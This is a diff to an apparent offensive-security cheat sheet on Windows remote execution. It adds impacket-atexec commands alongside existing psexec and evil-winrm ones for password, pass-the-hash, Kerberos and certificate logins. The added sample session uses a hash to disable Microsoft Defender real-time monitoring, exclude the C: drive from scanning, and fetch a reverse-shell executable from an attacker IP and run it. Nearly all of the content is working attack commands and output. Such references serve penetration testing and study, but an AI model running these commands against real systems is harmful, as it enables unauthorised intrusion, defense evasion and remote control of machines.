@@ -1,13 +1,13 @@
 ---
 title: "Winrm"
 date: 2024-7-27
-tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert", "Winrm", "Psexec"]
+tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert", "Winrm", "PsExec", "AtExec"]
 ---
 
-### Psexec
+### PsExec
 
 {{< tab set1 tab1 >}}Password{{< /tab >}}
-{{< tab set1 tab2 >}}Hash{{< /tab >}}
+{{< tab set1 tab2 >}}NTLM{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
@@ -35,13 +35,76 @@ impacket-psexec '<USER>@<TARGET>' -hashes :<HASH>
 
 {{< /tabcontent >}}
 
-### Evil-Winrm
+### AtExec
 
 {{< tab set2 tab1 >}}Password{{< /tab >}}
-{{< tab set2 tab2 >}}Hash{{< /tab >}}
-{{< tab set2 tab3 >}}Kerberos{{< /tab >}}
-{{< tab set2 tab4 >}}crt & key{{< /tab >}}
+{{< tab set2 tab2 >}}NTLM{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
+
+```console
+# Local auth
+impacket-atexec '<WORKGROUP>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' 'powershell.exe -c "<CMD>"'
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+```console
+# Local auth
+impacket-atexec '<WORKGROUP>/<USER>@<TARGET_DOMAIN>' -hashes :<HASH> 'powershell.exe -c "<CMD>"'
+```
+
+```console {class=sample-code}
+$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] This will work ONLY on Windows >= Vista
+[*] Creating task \gNBJCrJi
+[*] Running task \gNBJCrJi
+[*] Deleting task \gNBJCrJi
+[*] Attempting to read ADMIN$\Temp\gNBJCrJi.tmp
+                                                                                                                                                            
+$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "Set-MpPreference -ExclusionPath C:\\"'
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] This will work ONLY on Windows >= Vista
+[*] Creating task \cbUEDAaz
+[*] Running task \cbUEDAaz
+[*] Deleting task \cbUEDAaz
+[*] Attempting to read ADMIN$\Temp\cbUEDAaz.tmp
+                                                                                                                                                            
+$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "iwr 10.8.7.13:8443/rev.exe -outfile C:\programdata\rev.exe"'
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] This will work ONLY on Windows >= Vista
+[*] Creating task \RmSAvink
+[*] Running task \RmSAvink
+[*] Deleting task \RmSAvink
+[*] Attempting to read ADMIN$\Temp\RmSAvink.tmp
+                                                                                                                                                            
+$ impacket-atexec -hashes :a29542cb2707bf6d6c1d2c9311b0ff02 'WS01/administrator@WS01.example.com' 'powershell.exe -c "C:\programdata\rev.exe"' 
+ 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] This will work ONLY on Windows >= Vista
+[*] Creating task \LCpKICMQ
+[*] Running task \LCpKICMQ
+[*] Deleting task \LCpKICMQ
+[*] Attempting to read ADMIN$\Temp\LCpKICMQ.tmp
+```
+
+{{< /tabcontent >}}
+
+### Evil-Winrm
+
+{{< tab set3 tab1 >}}Password{{< /tab >}}
+{{< tab set3 tab2 >}}NTLM{{< /tab >}}
+{{< tab set3 tab3 >}}Kerberos{{< /tab >}}
+{{< tab set3 tab4 >}}crt & key{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
 
 ```console
 evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>'
@@ -61,14 +124,14 @@ Info: Establishing connection to remote endpoint
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set2 tab2 >}}
+{{< tabcontent set3 tab2 >}}
 
 ```console
 evil-winrm -i <TARGET> -u '<USER>' -H <HASH> 
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set2 tab3 >}}
+{{< tabcontent set3 tab3 >}}
 
 ```console
 # Step 1: Edit '/etc/krb5.conf' (All in uppercase)
@@ -137,7 +200,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set2 tab4 >}}
+{{< tabcontent set3 tab4 >}}
 
 ```console
 evil-winrm -i <TARGET> -S -k auth.key -c auth.crt
